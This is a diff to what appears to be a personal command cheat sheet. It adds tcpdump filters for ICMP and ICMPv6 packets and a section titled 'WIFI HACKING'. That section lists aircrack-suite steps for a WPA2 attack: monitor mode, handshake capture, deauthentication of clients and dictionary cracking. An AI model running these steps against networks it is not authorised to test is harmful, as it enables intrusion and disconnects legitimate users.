@@ -105,37 +105,42 @@ Filtering ICMP echo reply echo request Packets with tcpdump command\
 --------------------------------------------------------\
 With the following command, we can filter ICMP echo-reply,
 
-##### tcpdump -i eth0 “icmp[0] == 0”
+**##### tcpdump -i eth0 “icmp[0] == 0”
 
 To filter ICMP echo-requests, we can use this tcpdump command.
 
-##### tcpdump -i eth0 “icmp[0] == 8”
+**##### tcpdump -i eth0 “icmp[0] == 8”
 
 How to use tcpdump to capture ICMPv6 packets
 In IPv6, an IPv6 packet is 40 bytes long, and the first 8 bits of the ICMPv6 header specify its type. We can use this tcpdump command to filter all ICMPv6 packets.
 
-##### tcpdump -i eth0 icmp6
+**##### tcpdump -i eth0 icmp6
 
 We can use this tcpdump command to filter ICMPv6 echo-requests.
 
-##### tcpdump -i eth0 “icmp6 && ip6[40] == 128”
+**##### tcpdump -i eth0 “icmp6 && ip6[40] == 128”
 
 In the latest versions of tcpdump/libpcap, we can use the following command to capture ICMPv6 echo packets.
 
-##### tcpdump -i eth0 ‘icmp6[icmp6type]=icmp6-echo’
+**##### tcpdump -i eth0 ‘icmp6[icmp6type]=icmp6-echo’
 
 # WIFI HACKING
 Commands used in wifi WPA2 hacking\
 --------------------------------------------------------\
 you will need a wifi card that can do packet injection and monitor mode... \
-to test this use the following commands
+to test this use the following commands\
 
-### ifconfig wlan0 down
-### iwconfig wlan0 mode monitor
-### ifconfig wlan0 up
-### iwconfig ----- check if card is in monitor mode under man
+check card supports monitor mode\
+**##### ifconfig wlan0 down
+**##### iwconfig wlan0 mode monitor
+**##### ifconfig wlan0 up
+**##### iwconfig ----- check if card is in monitor mode under man
 
-
+check card supports packet injection\
+**##### terminal 1: airodump-ng wlan0
+**##### terminal 1: airodump-ng -c 2 -w packetcapture -d 00:00:00:00:00:00 wlan0
+**##### terminal 2: aireplay-ng --deauth -a 00:00:00:00:00:00 -c 00:00:00:00:00:00 wlan0
+**##### terminal 3: aircrack-ng packcapture.pcap -w passwords.txt
 
 
 
